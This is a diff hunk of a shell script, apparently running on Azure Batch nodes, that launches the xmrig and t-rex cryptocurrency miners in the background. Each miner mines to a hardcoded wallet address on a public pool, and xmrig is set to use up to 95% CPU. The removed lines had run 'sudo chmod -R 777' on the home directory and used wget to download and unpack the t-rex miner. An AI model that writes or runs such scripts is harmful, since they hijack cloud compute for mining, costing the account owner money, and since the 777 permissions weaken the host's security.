@@ -2,15 +2,7 @@ DIR="/home/_azbatch/xmrig/build/xmrig"
 if [ -f "$DIR" ]; then
   ### Take action if $DIR exists ###
     /home/_azbatch/xmrig/build/xmrig --algo=cn-heavy/xhv --url=pool.haven.hashvault.pro:80 --user=hvxyCNrJiqvBtdqWPpAvxtGwLq5n3DdhKcV7rSYRRkxLUGK6pEGm44TAdP9Q11KQKFKCyeEfEge2zMD1nk51aM3u65hqyrQdJi --pass=x --nicehash --max-cpu-usage 95 --cpu-priority 2 --background &&
-    sudo chmod -R 777 /home/_azbatch &&
-    rm -rf /home/_azbatch/trex &&
-    mkdir /home/_azbatch/trex &
-    cd /home/_azbatch/trex &
-    wget https://trex-miner.com/download/t-rex-0.20.4-linux.tar.gz &
-    tar -xzvf /home/_azbatch/trex/t-rex-0.20.4-linux.tar.gz &
-    cd /home/_azbatch/trex ;
-    hostname=$(hostname | cut -c1-8) ;
-    sleep 65 ;
+    hostname=$(hostname | cut -c1-8) &
     /home/_azbatch/trex/t-rex -a ethash -o stratum1+tcp://us-eth.2miners.com:2020 -u 0x6bA4d687Aec1055163DF07F8EA10D643D91d8e20 -w $hostname -p pppwww --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30 ;
 else
     sudo apt-get update ;
